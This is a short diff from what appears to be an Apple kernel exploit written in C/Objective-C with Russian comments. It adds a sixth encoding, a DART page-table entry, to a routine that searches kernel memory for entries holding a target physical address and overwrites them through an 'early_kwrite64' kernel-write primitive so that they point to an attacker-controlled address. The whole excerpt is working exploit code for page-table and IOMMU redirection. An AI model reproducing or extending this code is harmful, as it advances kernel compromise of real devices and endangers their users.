@@ -6105,6 +6105,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     else if ((uint32_t)q == pfn32) form = 4;          // pfn в low32
                     else if ((q & 0xFFFF000000000000ULL) &&
                              (q & 0x0000FFFFFFFFF000ULL) == backingPA) form = 5;  // PA + флаги (PTE-стиль)
+                    else if ((q & 0x000003FFFE000000ULL) == (backingPA & 0x000003FFFE000000ULL) &&
+                             (q & ~0x000003FFFE000000ULL)) form = 6;              // DART PTE (р.35: PA биты [37:13])
                     if (!form) continue;
                     BOOL dup = NO;
                     for (int j = 0; j < nSlots; j++) if (slotVAs[j] == ob + o) { dup = YES; break; }
@@ -6187,6 +6189,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                   : (slotForm[j] == 2) ? ctlPA
                                   : (slotForm[j] == 3) ? (ctlPA >> 14)
                                   : (slotForm[j] == 5) ? ((origQs[j] & 0xFFFF000000000000ULL) | ctlPA)
+                                  : (slotForm[j] == 6) ? ((origQs[j] & ~0x000003FFFE000000ULL) | (ctlPA & 0x000003FFFE000000ULL))
                                   : ((origQs[j] & 0xFFFFFFFF00000000ULL) | (uint64_t)ctlPFN);
                     newQs[j] = newQ;
                     early_kwrite64(slotVAs[j], newQ);
